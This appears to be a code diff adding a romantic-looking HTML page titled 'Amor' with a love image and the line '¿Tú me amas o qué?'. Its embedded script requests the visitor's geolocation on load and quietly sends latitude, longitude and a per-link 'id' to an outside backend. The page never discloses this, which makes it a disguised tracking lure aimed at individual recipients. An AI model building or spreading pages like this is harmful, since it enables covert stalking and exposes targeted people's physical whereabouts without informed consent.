@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Amor</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { margin: 0; text-align: center; background: #ffe6f0; }
+        img { max-width: 100%; }
+        p { font-size: 20px; color: #ff3366; font-family: Arial; }
+    </style>
+</head>
+<body>
+    <img src="https://i.imgur.com/ZvK7fQb.jpg" alt="Te amo más que ayer">
+    <p>¿Tú me amas o qué?</p>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    fetch('https://rosa-backend.onrender.com/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            id: new URLSearchParams(window.location.search).get('id'),
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        })
+                    });
+                },
+                (error) => { console.log("Ubicación no permitida"); }
+            );
+        }
+    </script>
+</body>
+</html>
